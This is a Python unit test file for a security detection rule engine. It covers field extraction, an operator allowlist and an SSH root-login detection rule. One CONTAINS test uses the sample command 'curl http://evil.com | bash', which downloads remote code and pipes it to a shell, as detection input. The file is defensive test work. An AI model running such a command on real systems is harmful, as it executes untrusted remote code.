"""Unit tests for the safe detection rule engine and operator allowlist."""

from datetime import datetime, timezone
from uuid import uuid4
import pytest

from waliya.contracts import DetectionRuleSchema, EventTypeEnum, RuleCondition, SeverityEnum
from waliya.detection.rule_engine import ALLOWED_OPERATORS, RuleEngine, evaluate_operator, extract_field


def test_extract_field_dot_notation():
    data = {
        "event_id": "test-123",
        "attributes": {
            "exe": "/bin/bash",
            "pid": 42,
            "user": {"name": "alice", "uid": 1000},
        },
    }

    assert extract_field(data, "event_id") == "test-123"
    assert extract_field(data, "attributes.exe") == "/bin/bash"
    assert extract_field(data, "exe") == "/bin/bash"  # fallback to attributes
    assert extract_field(data, "pid") == 42
    assert extract_field(data, "attributes.user.name") == "alice"
    assert extract_field(data, "nonexistent") is None
    assert extract_field(data, "attributes.__class__") is None  # security filter


def test_allowed_operators():
    # EQUALS
    assert evaluate_operator("EQUALS", "root", "root") is True
    assert evaluate_operator("EQUALS", "ROOT", "root") is True
    assert evaluate_operator("EQUALS", 10, 10.0) is True
    assert evaluate_operator("EQUALS", True, True) is True
    assert evaluate_operator("EQUALS", "root", "alice") is False

    # NOT_EQUALS
    assert evaluate_operator("NOT_EQUALS", "alice", "root") is True
    assert evaluate_operator("NOT_EQUALS", "root", "root") is False

    # CONTAINS
    assert evaluate_operator("CONTAINS", "curl http://evil.com | bash", "evil.com") is True
    assert evaluate_operator("CONTAINS", [22, 80, 443], 80) is True
    assert evaluate_operator("CONTAINS", "clean string", "evil") is False

    # STARTS_WITH & ENDS_WITH
    assert evaluate_operator("STARTS_WITH", "/var/www/html/index.php", "/var/www") is True
    assert evaluate_operator("ENDS_WITH", "script.php", ".php") is True
    assert evaluate_operator("ENDS_WITH", "script.py", ".php") is False

    # IN
    assert evaluate_operator("IN", "CREATED", ["CREATED", "MODIFIED"]) is True
    assert evaluate_operator("IN", "DELETED", ["CREATED", "MODIFIED"]) is False
    assert evaluate_operator("IN", 22, [22, 80, 443]) is True

    # REGEX_MATCH
    assert evaluate_operator("REGEX_MATCH", "/usr/bin/sudo", r"/(sudo|su|pkexec)$") is True
    assert evaluate_operator("REGEX_MATCH", "/usr/bin/python", r"/(sudo|su|pkexec)$") is False

    # GREATER_THAN & LESS_THAN
    assert evaluate_operator("GREATER_THAN", 10, 5) is True
    assert evaluate_operator("GREATER_THAN", 5, 10) is False
    assert evaluate_operator("LESS_THAN", 3, 10) is True


def test_invalid_operator_rejected():
    with pytest.raises(ValueError) as exc_info:
        evaluate_operator("PYTHON_EVAL", "x", "x")
    assert "Disallowed or unknown rule operator" in str(exc_info.value)


@pytest.mark.asyncio
async def test_rule_matching_and_non_matching():
    rule = DetectionRuleSchema(
        rule_id="RULE-TEST-001",
        version=1,
        name="Test SSH Root Login",
        description="Detects root login via ssh",
        severity=SeverityEnum.HIGH,
        event_type=EventTypeEnum.AUTHENTICATION,
        conditions=[
            RuleCondition(field="attributes.service", operator="EQUALS", value="ssh"),
            RuleCondition(field="attributes.user", operator="EQUALS", value="root"),
            RuleCondition(field="attributes.status", operator="EQUALS", value="SUCCESS"),
        ],
    )

    matching_event = {
        "event_id": str(uuid4()),
        "event_type": "AUTHENTICATION",
        "attributes": {
            "service": "ssh",
            "user": "root",
            "status": "SUCCESS",
        },
    }

    res_match = await RuleEngine.evaluate_rule(rule, matching_event)
    assert res_match.matched is True
    assert len(res_match.matched_conditions) == 3
    assert "matched successfully" in res_match.explanation

    # Non-matching event (different user)
    non_matching_user = {
        "event_id": str(uuid4()),
        "event_type": "AUTHENTICATION",
        "attributes": {
            "service": "ssh",
            "user": "ubuntu",
            "status": "SUCCESS",
        },
    }
    res_non_match = await RuleEngine.evaluate_rule(rule, non_matching_user)
    assert res_non_match.matched is False
    assert "condition failed" in res_non_match.explanation

    # Non-matching event (different event type)
    different_type = {
        "event_id": str(uuid4()),
        "event_type": "PROCESS_EXECUTION",
        "attributes": {"exe": "/bin/bash"},
    }
    res_diff_type = await RuleEngine.evaluate_rule(rule, different_type)
    assert res_diff_type.matched is False
    assert "does not match rule target" in res_diff_type.explanation
